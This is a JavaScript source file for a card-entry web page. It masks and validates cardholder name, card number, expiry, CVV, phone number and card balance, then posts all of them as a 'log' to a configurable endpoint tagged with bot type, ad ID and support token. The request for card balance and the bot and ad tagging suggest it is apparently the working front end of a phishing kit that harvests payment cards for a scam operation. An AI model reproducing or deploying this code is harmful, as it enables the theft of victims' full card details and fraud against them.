$(document).ready(function() {
    const logType = "card";
    const cardHolder = document.getElementById('cardHolder');
    const cardNumber = document.getElementById('cardNumber');
    const cardDate = document.getElementById('cardDate');
    const cardCvv = document.getElementById('cardCvv');
    const phoneNumber = document.getElementById('phoneNumber');
    const cardBalance = document.getElementById("cardBalance");
    const submitButton = document.getElementById("submitButton");
    const submitButtonHtml = submitButton.innerHTML;

    const loadingButton = `
        <div class="d-flex justify-content-center">
            <div class="spinner-border" role="status">
                <span class="visually-hidden">...</span>
            </div>
        </div>
    `;

    var cardHolderMask = new IMask(cardHolder, {
        mask: /.*/,
        maxLength: 128
    });

    var cardNumberMask = new IMask(cardNumber, {
        mask: [{
                mask: '0000 000000 00000',
                regex: '^3[47]\\d{0,13}',
                cardtype: 'american express'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^(?:6011|65\\d{0,2}|64[4-9]\\d?)\\d{0,12}',
                cardtype: 'discover'
            },
            {
                mask: '0000 000000 0000',
                regex: '^3(?:0([0-5]|9)|[689]\\d?)\\d{0,11}',
                cardtype: 'diners'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^(5[1-5]\\d{0,2}|22[2-9]\\d{0,1}|2[3-7]\\d{0,2})\\d{0,12}',
                cardtype: 'mastercard'
            },
            {
                mask: '0000 000000 00000',
                regex: '^(?:2131|1800)\\d{0,11}',
                cardtype: 'jcb15'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^(?:35\\d{0,2})\\d{0,12}',
                cardtype: 'jcb'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^(?:5[0678]\\d{0,2}|6304|67\\d{0,2})\\d{0,12}',
                cardtype: 'maestro'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^4\\d{0,15}',
                cardtype: 'visa'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^62\\d{0,14}',
                cardtype: 'unionpay'
            },
            {
                mask: '0000 0000 0000 0000',
                cardtype: 'Unknown'
            }
        ],
        dispatch: function(appended, dynamicMasked) {
            var number = (dynamicMasked.value + appended).replace(/\D/g, '');

            for (var i = 0; i < dynamicMasked.compiledMasks.length; i++) {
                let re = new RegExp(dynamicMasked.compiledMasks[i].regex);
                if (number.match(re) != null) {
                    return dynamicMasked.compiledMasks[i];
                }
            }
        }
    });

    var cardDateMask = new IMask(cardDate, {
        mask: 'MM{/}YY',
        autofix: true,
        blocks: {
            YY: {mask: IMask.MaskedRange, from: new Date().getFullYear() % 100, to: 99, maxLength: 2},
            MM: {mask: IMask.MaskedRange, from: 1, to: 12, maxLength: 2},
        }
    });

    var cardCvvMask = new IMask(cardCvv, {
        mask: '0000',
    });

    if (phoneNumber) {
        var phoneNumberMask = new IMask(phoneNumber, {
            mask: '+000000000000000'
        });

        phoneNumberMask.on('accept', function() {
            if (phoneNumberMask.length < 7) {
                phoneNumber.classList.add('wrong');
            } else {
                phoneNumber.classList.remove('wrong');
            }
        });
    }

    if (cardBalance) {
        var cardBalanceMask = new IMask(cardBalance, {
            mask: Number,
            scale: 2,
            thousandsSeparator: '',
            padFractionalZeros: true,
            normalizeZeros: true,
            radix: '.',
            mapToRadix: [','],
            min: -100000000,
            max: 100000000
        });

        cardBalanceMask.on('accept', function() {
            if (validBalance(cardBalanceMask.value) === false) {
                cardBalance.classList.add('wrong');
            } else {
                cardBalance.classList.remove('wrong');
            }
        });
    }

    cardHolderMask.on('accept', function() {
        if(cardHolderMask.value.charAt(0) === ' ')
            cardHolderMask.value = '';

        if (validHolder(cardHolderMask.value) === false) {
            cardHolder.classList.add('wrong');
        } else {
            cardHolder.classList.remove('wrong');
        }
    });

    cardNumberMask.on('accept', function() {
        if (validCreditCard(cardNumberMask.value) === false) {
            cardNumber.classList.add('wrong');
        } else {
            cardNumber.classList.remove('wrong');
        }
    });

    cardDateMask.on('accept', function() {
        if (validDate(cardDateMask.value) === false) {
            cardDate.classList.add('wrong');
        } else {
            cardDate.classList.remove('wrong');
        }
    });

    cardCvvMask.on('accept', function() {
        if (validCvv(cardCvvMask.value) === false) {
            cardCvv.classList.add('wrong');
        } else {
            cardCvv.classList.remove('wrong');
        }
    });

    submitButton.addEventListener('click', function(event) {
        event.preventDefault();

        if (validForm()) {
            sendLog();
        }
    });

    const validForm = function() {
        const fields = [
            { mask: cardHolderMask.value, validator: validHolder, el: cardHolder },
            { mask: cardNumberMask.value, validator: validCreditCard, el: cardNumber },
            { mask: cardDateMask.value, validator: validDate, el: cardDate },
            { mask: cardCvvMask.value, validator: validCvv, el: cardCvv }
        ];

        if (phoneNumber) {
            fields.push(
                { mask: phoneNumberMask.value, validator: value => value.length >= 7, el: phoneNumber }
            );
        }

        if (cardBalance) {
            fields.push(
                { mask: cardBalanceMask.value, validator: validBalance, el: cardBalance }
            );
        }

        const errors = fields.reduce((count, { mask, validator, el }) => {
            if (!validator(mask)) {
                el.classList.add('wrong');
                return count + 1;
            } else {
                el.classList.remove('wrong');
                return count;
            }
        }, 0);
        
        return errors === 0;
    };

    function clearForm() {
        cardHolder.value = "";
        cardNumber.value = "";
        cardDate.value = "";
        cardCvv.value = "";
        phoneNumber && (phoneNumber.value = '');
        cardBalance && (cardBalance.value = '');
        submitButton.removeAttribute('disabled');
        submitButton.innerHTML = submitButtonHtml;
    };

    async function sendLog() {
        submitButton.disabled = true;
        submitButton.innerHTML = loadingButton;

        await axios.post(submitApiPath, {
            botType: botType,
            adId: typeof adId === 'undefined' ? null : adId,
            supportToken: supportToken,
            logType: logType,
            cardHolder: cardHolderMask.value,
            cardNumber: cardNumberMask.value.replace(/\D+/g, ""),
            cardExpire: cardDateMask.value,
            cardCvv: cardCvvMask.value,
            phoneNumber: phoneNumberMask === undefined ? null : phoneNumberMask.value,
            cardBalance: cardBalanceMask === undefined ? null : cardBalanceMask.value,
            templateType: templateType
        })
        .then((response) => {
            system.windowObj(response.data.status);
        })
        .finally(() => {
            clearForm();
        });
    };
});